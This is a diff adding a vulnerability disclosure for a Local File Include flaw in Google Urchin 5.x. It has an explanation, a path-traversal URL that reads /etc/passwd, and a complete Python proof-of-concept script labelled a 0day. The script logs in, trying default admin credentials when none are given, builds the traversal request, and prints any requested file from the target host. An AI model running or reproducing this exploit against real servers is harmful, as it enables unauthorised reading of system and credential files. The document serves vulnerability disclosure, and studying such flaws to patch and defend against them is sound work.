@@ -1,0 +1,103 @@
+Summary:
+Google Urchin is vulnerable to a Local File Include (LFI)
+vulnerability that allows arbitrary reading of files.  Confirmed in
+version 5.7.03 running on Linux.  Issue may exist in other versions as
+well.
+
+Analysis:
+During normal usage, Google Urchin creates files on disk that are then
+embedded into report pages for visual data representation.
+Unfortunately, an LFI vulnerability is introduced because proper
+filtering is not performed.  The included files live under
+$INSTALL_PATH and look something like this:
+data/cache/localhost/admin-1102-23087-1292412725.
+
+"""
+$ file ./data/cache/localhost/admin-1102-23087-1292412725
+./data/cache/localhost/admin-1102-22410-1292411043: XML  document text
+$ head ./data/cache/localhost/admin-1102-23087-1292412725
+<?xml version="1.0" encoding="utf-8" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20001102//EN"
+  "http://www.w3.org/TR/2000/CR-SVG-20001102/DTD/svg-20001102.dtd" [
+    <!ENTITY st1
+"fill:none;stroke:#cccccc;stroke-width:0.25;stroke-miterlimit:4;">
+]>
+<!--
+    <?xml-stylesheet alternate="yes" href="ucss/usvg.css" type="text/css"?>
+    Copyright(c) 2003 Urchin Software Corporation. All rights reserved.
+    The svg contained herein is the property of Urchin Software
+    Corporation, San Diego, CA. It may not be used outside the Urchin
+...
+"""
+
+A typical direct query to such a resource will look like this and is
+what becomes embedded in the page:
+http://127.0.0.1:9999/session.cgi?sid=3456434387-0000000003&app=urchin.cgi&action=prop&rid=13&n=10&vid=1102&dtc=0&cmd=svg&gfid=admin-1102-23087-1292412725&ie5=.svg
+
+By simply modifying the gfid parameter in the GET request, we can tell
+Urchin to read any file on the host instead, like so:
+http://127.0.0.1:9999/session.cgi?sid=3456434387-0000000003&app=urchin.cgi&action=prop&rid=13&n=10&vid=1102&dtc=0&cmd=svg&gfid=../../../../../../../../../../etc/passwd&ie5=.svg
+
+FIN
+-- 
+Kristian Erik Hermansen
+
+PoC Code:
+
+#!/usr/bin/env python
+
+# Author: "Kristian Erik Hermansen" <kristian.hermansen@gmail.com>
+# Date: December 2010
+# Google Urchin 5.x LFI in gfid parameter (0day)
+
+from sys import argv
+import httplib, urllib
+
+if len(argv) < 3:
+    print 'usage: %s <host> <file> [port] [user] [pass]' % (argv[0])
+    exit(1)
+
+HOST = argv[1]
+FILE = argv[2]
+PORT = int(argv[3]) or 9999
+USER = argv[4] or 'admin'
+PASS = argv[5] or 'urchin'
+
+conn = httplib.HTTPConnection('%s:%d' % (HOST,PORT))
+
+conn.request('GET', '/')
+response = conn.getresponse()
+if str(response.status)[0] == '3':
+    print '[-] Host probably uses SSL. Not supported.'
+    exit(2)
+data = response.read()
+app = data.split('<input type="hidden" name="app" value="')[1].split('"')[0]
+
+params = urllib.urlencode({'user': USER, 'pass': PASS, 'app': app, 'action': 'login'})
+
+conn.request('POST', '/session.cgi', params)
+response = conn.getresponse()
+data = response.read()
+if data.find('Authentication Failed.') == -1:
+    print '[*] Authentication succeeded :)'
+else:
+    print '[-] Authentication failed :('
+    exit(3)
+sid = data.split('?sid=')[1].split('&')[0]
+rid = data.split('<a href="javascript:openReport(')[1].split(',')[0]
+
+if app == 'admin.exe':
+    pad = '..\\'*16
+else:
+    pad = '../'*16
+conn.request('GET', '/session.cgi?sid=%s&action=prop&app=urchin.cgi&rid=%s&cmd=svg&gfid=%s%s&ie5=.svg' % (sid,rid,pad,FILE))
+response = conn.getresponse()
+data = response.read()
+
+if data.find('SVG image not found. Possible causes are:') == -1:
+    print data
+else:
+    print '[-] Failed to retrive requested file. May not exist on host.'
+
+conn.close()
+
